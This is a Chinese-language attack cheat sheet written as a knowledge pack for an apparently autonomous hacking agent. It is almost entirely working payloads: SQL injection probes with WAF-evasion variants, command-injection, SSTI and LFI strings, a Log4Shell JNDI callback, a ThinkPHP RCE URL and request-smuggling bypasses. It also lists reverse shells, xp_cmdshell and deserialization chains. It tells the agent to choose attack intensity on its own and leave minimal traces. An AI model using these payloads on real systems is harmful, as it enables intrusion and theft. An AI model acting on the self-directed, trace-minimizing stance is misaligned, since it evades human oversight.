# 攻击技术速查（内置知识包）

> 来源：SQL/RCE 骚操作 162 条 + WAF 绕过 80 条，精炼为实用速查。
> 前提：仅对已获授权的目标使用。操作强度由 Agent 按授权范围与任务目标自主决策，高危操作注意控制影响面、留下最小痕迹。

## SQL 注入探测探针（确定性复验）

| 类型 | 探针 | 预期证据 |
|---|---|---|
| 报错注入 | `1' AND extractvalue(1,concat(0x7e,user()))-- ` | `XPATH syntax error` |
| 报错注入 | `1' AND updatexml(1,concat(0x7e,database()),1)-- ` | `XPATH syntax error` |
| floor 报错 | `AND (SELECT 1 FROM (SELECT count(*),concat(floor(rand(0)*2),user())x FROM information_schema.tables GROUP BY x)a)` | `Duplicate entry` |
| 布尔盲注 | `1' AND 1=1-- ` vs `1' AND 1=2-- ` | 两响应内容差异 |
| 时间盲注 | `1' AND IF(1=1,sleep(5),0)-- ` | 响应延迟 ≈5s |
| MSSQL 时间 | `1';WAITFOR DELAY '0:0:5'-- ` | 延迟 ≈5s |
| PostgreSQL | `1 AND cast(version() as int)>0` | 类型报错 |
| Oracle 报错 | `utl_inaddr.get_host_name((select user from dual))` | ORA 报错 |
| 万能密码 | `' OR 1=1-- ` / `') OR ('1'='1` / `admin'--` | 登录成功差异 |
| 宽字节 | `%df%27 OR 1=1-- ` | GBK 吃反斜杠逃逸 |
| 堆叠 | `1';SELECT sleep(5)-- ` | 延迟（multi_query 后端） |

## 过滤绕过变形（对上述探针逐层套用）

- 关键字：`sElEcT`（大小写）/ `se/**/lect`（注释拆分）/ `se%0alect`（换行）/ 双写 `SelEctect` / 全角 `ＳＥＬＥＣＴ`
- 空格：`/**/`、反引号、括号、`%09 %0b %0c %0d %a0`、`+`
- 等号：`LIKE` / `BETWEEN 1 AND 1` / `IN(1)` / `NOT id>1 AND NOT id<1`
- 引号：`0x61646d696e`（Hex）/ `CHAR(97,100,109,105,110)`
- 双重编码：`%2527` → `%27` → `'`（WAF 只解一层时绕过）
- 参数污染：`?id=1&id=2 union select...`（WAF 检测第一个，后端取最后一个；PHP 取最后，JSP 取第一）
- 绕 information_schema：`sys.schema_table_statistics` / `mysql.innodb_table_stats`

## RCE / 注入探针

| 类型 | 探针 | 预期证据 |
|---|---|---|
| 命令拼接 | `; id` / `\| id` / `&& id` / `\|\| id` / `` ` id ` `` / `$(id)` | 回显 `uid=` |
| 空格绕过 | `cat$IFS/etc/passwd` / `{cat,/etc/passwd}` / `cat</etc/passwd` | 文件内容 |
| 关键字绕过 | `c'a't` / `ca$()t` / `/bin/c?t` / `wh\oami` / `who$@ami` | 同上 |
| SSTI 探测 | `{{7*7}}` → `49`；`{{7*'7'}}` → `49` 则 Twig | 算术回显 |
| SSTI Jinja2 | `{{''.__class__.__mro__[1].__subclasses__()}}` | 子类列表 |
| SSTI Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}` | 执行回显 |
| LFI 读源码 | `php://filter/read=convert.base64-encode/resource=index.php` | base64 源码 |
| PHP 伪协议 | `data://text/plain,...` / `zip://` / `phar://` | 协议行为差异 |
| Log4Shell | `${jndi:ldap://dnslog/a}`（仅 DNSlog 验证） | DNS 回连 |
| ThinkPHP | `/index.php?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1` | phpinfo 回显 |

## WAF 协议层绕过（请求构造层面）

- **分块传输**：payload 拆 chunk（`4\r\nsele\r\n4\r\ncct\r\n0\r\n`）绕完整报文正则
- **Content-Type 混淆**：90% 站点同时收 form-urlencoded 和 multipart——换类型重发
- **方法覆盖**：`X-HTTP-Method-Override: PUT`；GET→POST 换法
- **超长填充**：Header 塞数万字节垃圾，把 payload 推到 WAF 扫描阈值外
- **IP 伪造**：`X-Forwarded-For: 127.0.0.1` 系列（8 个常用头）试探白名单信任链
- **走私（高级）**：CL.TE / TE.CL / TE.TE 混淆——需精确构造，工具化执行
- 语义伪装 XSS：`<svg onload>` / `<img src=x onerror>` / `<details open ontoggle>` / HTML 实体 `&#60;script&#62;`

## 进阶利用技术（按授权范围自主决策）

- MySQL `INTO OUTFILE/DUMPFILE` 写文件；SQLite `ATTACH DATABASE` 写马
- MSSQL `xp_cmdshell`（含 sp_configure 开启链）
- PostgreSQL `COPY TO PROGRAM`
- 反弹 shell 四件套（bash/python/perl/php）
- disable_functions 绕过（LD_PRELOAD/FFI/com_dotnet/ImageMagick）
- 反序列化链：Shiro RememberMe / Fastjson JNDI / Log4j / CommonsCollections / ThinkPHP Windows pipes / Laravel/Yii/Symfony POP
- SSRF→Redis 未授权→gopher 写计划任务链

## 组合链思路（Worker 规划参考）

1. SQLi → secure_file_priv 可写 → 写文件利用
2. 上传图片马 + LFI → 包含触发
3. XXE → 内网探测 → 内网服务指纹
4. SSRF → gopher 打内网 Redis/MySQL
5. 反序列化指纹命中 → 对应 gadget 链利用
